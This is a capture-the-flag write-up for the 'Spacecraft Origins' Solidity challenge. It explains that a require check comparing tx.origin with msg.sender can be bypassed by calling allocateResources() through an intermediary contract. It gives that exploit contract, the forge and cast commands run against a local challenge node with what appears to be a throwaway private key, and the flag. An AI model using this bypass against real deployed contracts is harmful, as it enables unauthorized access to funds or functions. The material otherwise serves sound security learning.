# Spacecraft Origins Write-up
## TL;DR
To solve this challenge `tx.origin` must be different than `msg.sender`. `tx.origin` is a global variable in Solidity that returns the address of the original externally owned account that initiated the transaction, and `msg.sender` returns the address that directly called the function.
So in order to solve the challenge, we need to call `allocateResources()` function using another smart contract (let's call it `SpaceCraft`), that way `msg.sender` will point to the `SpaceCraft` address, and `tx.origin` will point to our EOA that we deployed the `SpaceCraft` with, and the check in the `require` statement will be bypassed.
## Solving the challenge
- We first get our target contract address:
```bash
$cast call 0x06B3AB539140e970b36df7ff9965d4d573D24D78 "TARGET()" --rpc-url http://localhost:8545/06f7b1d3-a903-4427-8193-eec13c17d5fa
0x0000000000000000000000007b1bbf201603eb7bf1b0ee2053449ead3b5033b1
```
Target address is 0x7b1bbf201603eb7bf1b0ee2053449ead3b5033b1
- We make our solution directory:
```
$mkdir solution && cd solution/
$forge init . --no-git
```
- We write the contract that we want to interact with `AstroManager` and put it under `solution/src`.
### SpaceCraft.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {AstroManager} from "./AstroManager.sol";

contract SpaceCraft {
    AstroManager public astroManager;

    constructor(address _astroManager) {
        astroManager = AstroManager(_astroManager);
    }

    function callAllocateResources() external {
        astroManager.allocateResources();
    }
}
```
- We deploy the SpaceCraft contract using the following command:
```bash
└──╼ $forge create src/SpaceCraft.sol:SpaceCraft --private-key 0xbe6c2a2548bc47c891d3d7dea09d29591e82756629f0fc61e293274408d9b013 --rpc-url http://localhost:8545/06f7b1d3-a903-4427-8193-eec13c17d5fa --constructor-args 0x7b1bbf201603eb7bf1b0ee2053449ead3b5033b1
[⠒] Compiling...
[⠒] Compiling 26 files with 0.8.21
[⠰] Solc 0.8.21 finished in 3.93s
Compiler run successful!
Deployer: 0xFe12Fb4FF7430c46D45391dCccd6e54f643EDD6A
Deployed to: 0xb8c74C67824A9cDDc653935F076820D11Bf3F24B
Transaction hash: 0x02daac7a07a0216ff3e424f42dc957f7e7463ae462bc4c133fb67319146ec5b6
```
Now we can call `callAllocateResources()` from the `SpaceCraft()` contract to solve the challenge.
```bash
$cast send 0xb8c74C67824A9cDDc653935F076820D11Bf3F24B "callAllocateResources()" --private-key 0xbe6c2a2548bc47c891d3d7dea09d29591e82756629f0fc61e293274408d9b013 --rpc-url http://localhost:8545/06f7b1d3-a903-4427-8193-eec13c17d5fa
```
We're ready to get the flag.
## Flag
`shellmates{he4v3NLy_0RiG1n4Ted_Tr4N$4ct1On}`
